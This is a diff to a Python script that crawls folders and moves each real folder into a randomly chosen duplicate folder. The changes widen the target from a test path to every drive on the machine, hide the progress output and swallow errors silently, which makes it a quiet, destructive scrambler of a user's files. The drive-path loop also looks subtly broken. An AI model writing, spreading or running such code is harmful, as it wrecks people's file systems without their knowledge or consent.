@@ -12,10 +12,10 @@ import random
 #redo 
 
 def main():
+    PATH = ''
     drives = list_drives()
-    PATH = 'E:/Abb'
-    #for drive in drives:
-    #PATH += drive
+    for drive in drives:
+        PATH += drive
     file_cruser(PATH)
     return
 
@@ -43,18 +43,24 @@ def file_cruser(PATH):
         for folder in folders:
             newPATH = PATH
             newPATH += '/' + folder
-            print("Currently in:\n",newPATH)
+            #print("Currently in:\n",newPATH)
             file_cruser(newPATH)
-            Duplicate(PATH,folder)
+            try:
+                Duplicate(PATH,folder)
+            except:
+                pass
 
     else:
         newPathList = PATH.rsplit('/',1)
         Path = newPathList[0]
         FolderName = newPathList[1]
-        Duplicate(Path,FolderName)
+        try:
+            Duplicate(Path,FolderName)
+        except:
+            pass
 
 def Duplicate(PATH,Name):
-    print("Duplicated:\n",PATH,f"({Name})")
+    #print("Duplicated:\n",PATH,f"({Name})")
     duplicatedFolders = []
     os.chdir(PATH)
     
@@ -66,11 +72,22 @@ def Duplicate(PATH,Name):
             duplicatedFolders.append(newName)
         except:
             pass
-
+    
     max = len(duplicatedFolders) - 1
-    index = random.randint(0,max)
-    src = PATH + '/' + Name
-    dest = PATH + '/' + duplicatedFolders[index]
-    destination = shutil.move(src,dest)
+    if max > 1:
+        index = random.randint(0,max)
+        src = PATH + '/' + Name
+        dest = PATH + '/' + duplicatedFolders[index]
+        destination = shutil.move(src,dest)
+    else:
+        pass
 
-main()
+def duplicate(PATH,folder):
+    print("Duplicated:\n",PATH,f"({folder})")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        input("Press Enter to exit...")
